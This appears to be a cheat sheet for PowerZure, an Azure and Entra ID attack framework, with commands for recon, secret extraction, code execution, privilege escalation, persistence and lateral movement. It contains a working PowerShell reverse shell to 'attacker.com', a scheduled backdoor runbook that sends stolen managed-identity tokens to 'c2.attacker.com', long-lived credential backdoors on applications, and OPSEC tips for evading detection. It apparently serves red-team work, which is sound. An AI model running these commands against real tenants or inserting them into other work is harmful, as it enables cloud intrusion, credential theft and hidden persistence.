# PowerZure

**Type:** PowerShell Module
**Purpose:** Azure and Entra ID reconnaissance and exploitation framework
**Platform:** Windows, PowerShell Core (Linux/macOS)
**Tags:** #azure #azuread #powershell #enumeration #privesc #persistence #lateral-movement #post-exploitation

---

## Installation & Setup

```powershell
# Install Az module prerequisite
Install-Module -Name Az

# Import PowerZure
Import-Module C:\path\to\PowerZure.psd1

# Or use alias
ipmo C:\path\to\PowerZure.psd1

# Authenticate to Azure
Connect-AzAccount

# Set subscription (IMPORTANT!)
Set-AzureSubscription -Id <subscription-id>
# If you have multiple subscriptions and don't set this, commands will fail
```

---

## Quick Reference (Most Common Commands)

```powershell
# Check current user context
Get-AzureCurrentUser

# Compare permissions to available resources
Get-AzureTarget

# List all subscriptions
Get-AzureSubscription

# Find runbooks
Get-Runbook

# Execute code via runbook
Execute-Runbook -Script "whoami" -RunbookName "TestRunbook"

# Get deployment templates (may contain secrets)
Get-AzureDeploymentTemplate
```

---

## RECON: Information Gathering

### RECON: Current User Context
**Use Case:** Understand your current permissions and scope

```powershell
# View current user and roles
Get-AzureCurrentUser

# Show Azure RBAC roles
# Show EntraID directory roles
# Display assigned scopes

# Compare permissions to resources
Get-AzureTarget

# Shows what you can access based on your roles
```

### RECON: Subscription Enumeration
**Use Case:** List accessible subscriptions

```powershell
# List all subscriptions
Get-AzureSubscription

# Set active subscription
Set-AzureSubscription -Id "sub-id"

# Get subscription details
Get-AzSubscription
```

### RECON: Tenant Information
**Use Case:** Gather tenant details

```powershell
# Get tenant information
Get-AzTenant

# List all Azure AD users
Get-AzADUser

# List all groups
Get-AzADGroup

# List service principals
Get-AzADServicePrincipal
```

---

## ENUM: Resource Enumeration

### ENUM: Virtual Machines
**Use Case:** Discover VMs in subscription

```powershell
# List all VMs
Get-AzVM

# Get VM details
Get-AzVM -Name "vmname" -ResourceGroupName "rg-name"

# List VM extensions
Get-AzVMExtension -ResourceGroupName "rg-name" -VMName "vmname"

# Check for managed identity
Get-AzVM -Name "vmname" -ResourceGroupName "rg-name" | Select-Object -ExpandProperty Identity
```

### ENUM: Storage Accounts
**Use Case:** Find storage accounts and check for open access

```powershell
# List all storage accounts
Get-AzStorageAccount

# Get storage account keys
Get-AzStorageAccountKey -ResourceGroupName "rg-name" -Name "storageaccount"

# List containers in storage account
Get-AzStorageContainer -Context $ctx

# Check for public blob access
# Use MicroBurst Get-AzurePasswords for automated checks
```

### ENUM: Key Vaults
**Use Case:** Discover key vaults and secrets

```powershell
# List all key vaults
Get-AzKeyVault

# List secrets in key vault
Get-AzKeyVaultSecret -VaultName "vaultname"

# Get secret value (if you have permissions)
Get-AzKeyVaultSecret -VaultName "vaultname" -Name "secretname" -AsPlainText

# List keys
Get-AzKeyVaultKey -VaultName "vaultname"

# List certificates
Get-AzKeyVaultCertificate -VaultName "vaultname"
```

### ENUM: Automation Accounts
**Use Case:** Find automation accounts and runbooks

```powershell
# List automation accounts
Get-AzAutomationAccount

# List runbooks
Get-Runbook

# Get runbook content
Get-AzAutomationRunbook -Name "runbookname" -ResourceGroupName "rg-name" -AutomationAccountName "aa-name"

# Export runbook
Export-AzAutomationRunbook -Name "runbookname" -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -OutputFolder ./
```

### ENUM: App Services / Functions
**Use Case:** Enumerate web apps and function apps

```powershell
# List web apps
Get-AzWebApp

# Get app service configuration
Get-AzWebApp -Name "appname" -ResourceGroupName "rg-name"

# List function apps
Get-AzFunctionApp

# Get app settings (may contain secrets)
(Get-AzWebApp -Name "appname" -ResourceGroupName "rg-name").SiteConfig.AppSettings
```

---

## CRED: Credential & Secret Extraction

### CRED: Deployment Templates
**Use Case:** Extract credentials from ARM templates

```powershell
# Get deployment templates
Get-AzureDeploymentTemplate

# Templates often contain:
# - Passwords
# - Connection strings
# - API keys
# - Service principal secrets

# Parse for sensitive data
Get-AzureDeploymentTemplate | Select-String -Pattern "password|secret|key|connectionstring"
```

### CRED: Azure Automation Credentials
**Use Case:** Extract stored credentials from automation accounts

```powershell
# List automation credentials
Get-AzAutomationCredential -ResourceGroupName "rg-name" -AutomationAccountName "aa-name"

# Note: Azure encrypts credential values, but you can use them in runbooks
```

### CRED: Key Vault Secrets
**Use Case:** Extract secrets if you have access

```powershell
# Get all secrets from key vault
Get-AzKeyVaultSecret -VaultName "vaultname" | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName "vaultname" -Name $_.Name -AsPlainText
}

# Export to file
Get-AzKeyVaultSecret -VaultName "vaultname" | ForEach-Object {
    "$($_.Name): $(Get-AzKeyVaultSecret -VaultName "vaultname" -Name $_.Name -AsPlainText)"
} | Out-File secrets.txt
```

### CRED: Managed Identity Tokens
**Use Case:** Steal tokens from VM with managed identity

```powershell
# From inside Azure VM with managed identity
$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json

# Use token for authentication
Connect-AzAccount -AccessToken $token.access_token -AccountId "MSI@<resource-id>"
```

---

## EXEC: Code Execution

### EXEC: Runbook Execution
**Use Case:** Execute PowerShell code via Azure Automation runbook

```powershell
# Execute command via runbook
Execute-Runbook -Script "whoami" -RunbookName "TestRunbook"

# Execute script file
Execute-Runbook -Script (Get-Content script.ps1 -Raw) -RunbookName "TestRunbook"

# Reverse shell via runbook
$payload = @'
$client = New-Object System.Net.Sockets.TCPClient("attacker.com",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
'@

Execute-Runbook -Script $payload -RunbookName "ReverseShell"
```

### EXEC: VM Command Execution
**Use Case:** Run commands on Azure VMs

```powershell
# Using Run Command feature
Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vmname" -CommandId "RunPowerShellScript" -ScriptPath ./payload.ps1

# Run inline command
Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vmname" -CommandId "RunPowerShellScript" -ScriptString "whoami; hostname; ipconfig"
```

### EXEC: Function App Code Execution
**Use Case:** Execute code via Azure Functions

```powershell
# Get function app publish profile
Get-AzWebAppPublishingProfile -ResourceGroupName "rg-name" -Name "functionapp"

# Deploy malicious function
# Requires publishing credentials from profile
```

---

## PRIVESC: Privilege Escalation

### PRIVESC: Abuse Contributor Role
**Use Case:** Escalate from Contributor to higher privileges

```powershell
# If you have Contributor on subscription or resource group:

# Create new automation account
New-AzAutomationAccount -ResourceGroupName "rg-name" -Name "malicious-aa" -Location "eastus"

# Automation account runs with RunAs account (service principal)
# RunAs account has Contributor on subscription by default

# Execute code as RunAs account
Execute-Runbook -Script "whoami" -RunbookName "escalate"
```

### PRIVESC: Azure AD Application Permissions
**Use Case:** Escalate via application with high permissions

```powershell
# If you can modify an application with high permissions:

# Add owner to application
New-AzADAppCredential -ObjectId <app-object-id>

# Use new credentials to authenticate as application
# Application may have higher Graph permissions than user

# If app has RoleManagement.ReadWrite.Directory:
# Can grant yourself Global Admin via Graph API
```

### PRIVESC: VM Managed Identity Abuse
**Use Case:** Escalate using VM's managed identity permissions

```powershell
# From compromised VM with managed identity:

# Get token for Azure RM
$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json

# Check identity's permissions
# May have Contributor or Owner on resources
# Use those permissions to escalate

# Example: Add yourself to privileged group
Add-AzADGroupMember -TargetGroupObjectId <group-id> -MemberObjectId <your-object-id>
```

---

## PERSIST: Persistence Mechanisms

### PERSIST: Create Service Principal
**Use Case:** Create persistent access via service principal

```powershell
# Create application
$app = New-AzADApplication -DisplayName "LegitApp"

# Create service principal
$sp = New-AzADServicePrincipal -ApplicationId $app.ApplicationId

# Create secret
$secret = New-AzADAppCredential -ObjectId $app.ObjectId

# Grant permissions
New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "Contributor" -Scope "/subscriptions/<sub-id>"

# Save credentials
@{
    TenantId = (Get-AzContext).Tenant.Id
    ApplicationId = $app.ApplicationId
    Secret = $secret.SecretText
} | ConvertTo-Json | Out-File backdoor-sp.json

# Later, authenticate with service principal
$cred = Get-Credential  # Username: AppId, Password: Secret
Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant <tenant-id>
```

### PERSIST: Backdoor Runbook
**Use Case:** Create persistence via scheduled runbook

```powershell
# Create runbook that calls back to C2
$backdoorScript = @'
$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
Invoke-WebRequest -Uri "https://c2.attacker.com/beacon" -Method POST -Body $token.access_token
'@

# Import runbook
Import-AzAutomationRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "SystemCheck" -Type PowerShell -Path ./backdoor.ps1

# Publish runbook
Publish-AzAutomationRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "SystemCheck"

# Create schedule (daily execution)
New-AzAutomationSchedule -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "DailyCheck" -StartTime (Get-Date).AddDays(1) -DayInterval 1

# Link runbook to schedule
Register-AzAutomationScheduledRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -RunbookName "SystemCheck" -ScheduleName "DailyCheck"
```

### PERSIST: Azure AD Application Backdoor
**Use Case:** Maintain access via application credentials

```powershell
# Add secret to existing high-privilege application
New-AzADAppCredential -ObjectId <target-app-object-id> -EndDate (Get-Date).AddYears(10)

# The credential is added, but app owners may not notice
# Use the secret to maintain access
```

---

## LATERAL: Lateral Movement

### LATERAL: Subscription Hopping
**Use Case:** Move between subscriptions with same identity

```powershell
# List all accessible subscriptions
Get-AzSubscription

# Switch to different subscription
Set-AzContext -Subscription <subscription-id>

# Enumerate new subscription
Get-AzResource
```

### LATERAL: VM to VM via Network
**Use Case:** Lateral movement between VMs in same VNet

```powershell
# From compromised VM:

# Enumerate VMs in same resource group/VNet
Get-AzVM

# Check network security group rules
Get-AzNetworkSecurityGroup

# Use standard lateral movement techniques (RDP, SSH, WinRM)
# Often VMs trust each other within VNet
```

### LATERAL: Managed Identity Chaining
**Use Case:** Chain managed identity permissions

```powershell
# VM1 has managed identity with permissions on VM2

# From VM1:
$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json

# Use token to execute command on VM2
Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vm2" -CommandId "RunPowerShellScript" -ScriptString "whoami"
```

---

## Attack Patterns

### Pattern: Contributor → Automation Account → Privilege Escalation
```powershell
# 1. Verify you have Contributor role
Get-AzureCurrentUser
Get-AzureTarget

# 2. Create automation account
New-AzAutomationAccount -ResourceGroupName "CompanyRG" -Name "backdoor-aa" -Location "eastus" -Plan Free

# 3. Create and execute runbook
$escalateScript = "Add-AzADGroupMember -TargetGroupObjectId <admin-group-id> -MemberObjectId <your-id>"
Execute-Runbook -Script $escalateScript -RunbookName "Escalate"

# 4. Now you have admin privileges
```

### Pattern: VM Access → Managed Identity → Azure Control
```powershell
# 1. Compromise Azure VM (via vuln, cred stuffing, etc.)

# 2. Check for managed identity
(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -Headers @{Metadata="true"}).Content

# 3. Get token
$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json

# 4. Use token to control Azure resources
Connect-AzAccount -AccessToken $token.access_token -AccountId "MSI@50342380-0000-0000-ba00-000000000000"

# 5. Enumerate and exploit based on identity's permissions
Get-AzRoleAssignment
```

---

## Pro Tips

💡 **Set Subscription**: Always run `Set-AzureSubscription` if multiple subs exist
💡 **Deployment Templates**: Often goldmine of credentials and secrets
💡 **Runbook Execution**: Runs with high-privilege RunAs account
💡 **Managed Identities**: Check every VM - often overlooked persistence vector
💡 **Automation Accounts**: Free tier available, easy to create for persistence
💡 **Key Vault Access**: Even read-only on Key Vault can expose secrets
💡 **Resource Tagging**: Check tags for sensitive info (passwords, owners, etc.)
💡 **Combine with AADInternals**: Use both for full Azure + EntraID coverage
💡 **VM Extensions**: Can execute code, check for installed extensions
💡 **Application Permissions**: Apps can have higher permissions than users

---

## OPSEC Considerations

⚠️ **High Risk:**
- Creating new automation accounts (logged and may alert)
- Executing runbooks frequently
- Adding service principals to privileged roles
- Accessing many Key Vaults rapidly

⚠️ **Medium Risk:**
- Enumerating all resources in subscription
- Reading Key Vault secrets
- Executing VM run commands
- Exporting runbooks

✅ **Lower Risk:**
- Basic enumeration (Get-AzVM, Get-AzStorageAccount)
- Using existing automation accounts
- Reading deployment templates
- Viewing resource configurations

---

## Key Functions Reference

**Reconnaissance:**
- `Get-AzureCurrentUser`, `Get-AzureTarget`, `Get-AzureSubscription`

**Enumeration:**
- `Get-AzVM`, `Get-AzStorageAccount`, `Get-AzKeyVault`, `Get-Runbook`

**Credential Access:**
- `Get-AzureDeploymentTemplate`, `Get-AzKeyVaultSecret`, `Get-AzStorageAccountKey`

**Execution:**
- `Execute-Runbook`, `Invoke-AzVMRunCommand`

**Persistence:**
- `New-AzADApplication`, `New-AzADServicePrincipal`, `New-AzAutomationRunbook`

**Privilege Escalation:**
- `New-AzRoleAssignment`, `New-AzADAppCredential`

---

## Resources

- Documentation: https://powerzure.readthedocs.io
- GitHub: https://github.com/hausec/PowerZure
- Author: @haus3c (Ryan Hausknecht)
- Recommended companion tools: AzureHound, AADInternals, MicroBurst
